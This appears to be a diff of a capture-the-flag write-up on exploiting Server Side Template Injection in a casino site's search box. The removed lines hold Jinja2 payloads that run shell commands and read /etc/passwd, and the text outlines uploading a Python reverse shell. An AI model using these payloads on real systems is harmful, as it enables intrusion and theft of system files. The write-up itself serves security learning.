@@ -38,29 +38,21 @@ While browsing, on the team page, we can see that one of the team members is a F
 
 After seeing this, I can check for a potential SSTI (Server Side Template Injection) vulnerability. I followed the process from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
 Now, in the search box we can do the following tests:
+![SSTI Steps](casino-SSTI-steps.png)
 
-```bash
-${7*7}
-{{7*7}} 
-{{7*'7'}} 
-{{ self._TemplateReference\__context.cycler\.__init\__.\__globals\__.os.popen('id').read() }} 
-{{ get_flashed_messages.\__globals\__.\__builtins\__.open("/etc/passwd").read() }} 
-{{ self._TemplateReference\__context.namespace.\__init\__.\__globals\__.os.popen('ls /home').read() }} 
-{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('which python3').read() }}
-```
-![Test1](casino-SSTI-test-1.png)
+1. ![Test1](casino-SSTI-test-1.png)
 
-![Test2](casino-SSTI-test-2.png)
+2. ![Test2](casino-SSTI-test-2.png)
 
-![Test3](casino-SSTI-test-3.png)
+3. ![Test3](casino-SSTI-test-3.png)
 
-![Test4](casino-SSTI-id.png)
+4. ![Test4](casino-SSTI-id.png)
 
-![Test5](casino-SSTI-passwd.png)
+5. ![Test5](casino-SSTI-passwd.png)
 
-![Test6](casino-SSTI-ls.png)
+6. ![Test6](casino-SSTI-ls.png)
 
-![Test7](casino-SSTI-python3.png)
+7. ![Test7](casino-SSTI-python3.png)
     
 From, our strategy could be creating a Python file with a reverse shell and upload it to the server, then run it within the same script. The Python file looks like this and we save it as ***revshell.txt***:
 ```python
